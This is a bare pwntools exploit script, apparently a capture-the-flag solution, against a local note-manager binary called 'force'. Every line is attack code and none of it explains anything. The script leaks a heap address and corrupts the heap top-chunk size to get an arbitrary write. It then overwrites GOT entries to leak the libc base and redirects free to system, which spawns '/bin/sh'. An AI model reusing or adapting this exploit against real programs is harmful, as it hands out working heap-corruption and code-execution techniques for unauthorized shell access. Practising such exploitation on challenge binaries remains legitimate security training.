from pwn import *
context.log_level= "debug"
def add(lenth,content):
	p.readuntil("--->>")
	p.sendline("1")
	p.readuntil("Input the length of the note content:")
	p.sendline(str(lenth))
	p.readuntil("Input the content:")
	p.sendline(content)
def edit(id,message):
	p.readuntil("--->>")
	p.sendline("3")
	p.readuntil("id:\n")
	p.sendline(str(id))
	p.readuntil("Input the new content:\n")
	p.sendline(message)
	p.readuntil("success.")
def de(id):
	p.readuntil("--->>")
	p.sendline("4")
	p.readuntil("id:")
	p.sendline(str(id))
def init():
	p.readuntil("name:")
	p.send("A"*64)
	heap=p.readuntil("!")
	heap=u32(heap[-5:-1])-0x08
	log.info(hex(heap))
	p.readuntil("Org:")
	p.send(p32(0xdeadbeef)*16)
	p.readuntil("Host:")
	payload=p32(0xffffffff)
	p.sendline(payload)
	return heap
chain=0x0804B120
p=process("./force")
elf=ELF("./force")
libc=ELF("/lib/i386-linux-gnu/libc.so.6")
free_got=elf.got['free']
printf_trick=elf.symbols['printf']+0x6
heap=init()
size=0x804B118-heap-0xdc-0x8
add(size,"it is for the edit")
payload=p32(elf.got['atoi'])+p32(free_got)+p32(chain+0xc)+"/bin/sh\0"
add(48,payload)
edit(1,p32(printf_trick))#do not edit 0 because of it's lenth
de(0)
base=p.readuntil("Delet");
log.info(base)
libc.address=u32(base[1:5])-libc.symbols['atoi']
system=libc.symbols['system']
if False:
	gdb.attach(p,
	'''
	''')
edit(1,p32(system))
de(2)
p.interactive();
